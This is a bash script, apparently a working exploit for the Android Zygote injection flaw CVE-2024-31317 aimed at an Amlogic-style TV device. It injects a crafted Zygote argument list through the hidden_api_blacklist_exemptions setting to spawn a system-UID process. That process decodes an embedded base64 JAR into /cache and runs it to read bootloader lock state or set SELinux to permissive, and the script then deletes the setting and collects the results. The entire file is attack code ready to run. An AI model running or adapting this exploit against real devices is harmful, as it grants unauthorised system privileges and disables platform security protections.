#!/bin/bash
set -e
ACTION="${1:-read_lock}"

case "$ACTION" in
  read_lock)
    BOOTENV_CMD="BootEnv read lock"
    ;;
  read_lock_state)
    BOOTENV_CMD="BootEnv read lock_state"
    ;;
  read_selinux)
    BOOTENV_CMD="BootEnv read EnableSelinux"
    ;;
  set_selinux_permissive)
    BOOTENV_CMD="BootEnv set EnableSelinux permissive"
    ;;
  *)
    BOOTENV_CMD="BootEnv $ACTION"
    ;;
esac

# Self-deploying: base64 decode JAR to /cache/, run from there
CMD="echo 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 | base64 -d > /cache/be.jar && dalvikvm32 -cp /cache/be.jar:/vendor/framework/droidlogic.jar $BOOTENV_CMD > /cache/be.txt 2>&1"

PAYLOAD=$(printf 'LClass1;->method1(\n14\n--runtime-args\n--setuid=1000\n--setgid=1000\n--setgroups=1000\n--runtime-flags=43267\n--target-sdk-version=29\n--nice-name=bootenv31317\n--invoke-with\n%s ;\n--app-data-dir=/data/user/0/com.android.tv.settings\n--seinfo=platform:system_app:targetSdkVersion=29:complete\n--package-name=com.android.tv.settings\nandroid.app.ActivityThread' "$CMD")

echo "=== Boot-race CVE-2024-31317 v2 ==="
echo "Action: $ACTION → $BOOTENV_CMD"
echo "[*] Rebooting..."
adb reboot
adb wait-for-device
echo "[*] Waiting for boot..."
while [ "$(adb shell getprop sys.boot_completed 2>/dev/null)" != "1" ]; do sleep 1; done
echo "[*] Boot complete!"

adb shell "logcat -c" 2>&1
echo "[*] Injecting..."
adb shell "settings put global hidden_api_blacklist_exemptions '$PAYLOAD'" 2>&1
adb shell "am force-stop com.android.tv.settings" 2>&1
sleep 1
adb shell "am start -n com.android.tv.settings/.MainSettings" 2>&1
sleep 2
echo "[*] Cleanup..."
adb shell "settings delete global hidden_api_blacklist_exemptions" 2>&1
echo "[*] Verify: $(adb shell 'settings get global hidden_api_blacklist_exemptions' 2>&1)"
echo "[*] Waiting 10s for dalvikvm exec..."
sleep 10

echo ""
echo "=== RESULT (/cache/be.txt) ==="
adb shell "cat /cache/be.txt 2>/dev/null" 2>&1
echo ""
echo "=== /cache/be.jar ==="
adb shell "ls -la /cache/be.jar 2>/dev/null" 2>&1
echo ""
echo "=== logcat ==="
adb shell "logcat -d | grep -iE 'BootEnv|SysControl.*Manager|SystemControl.*[gs]etBootEnv|bootenv31317.*Calling|dalvikvm32.*class' | grep -v 'ACTION_APP'" 2>&1 | head -15
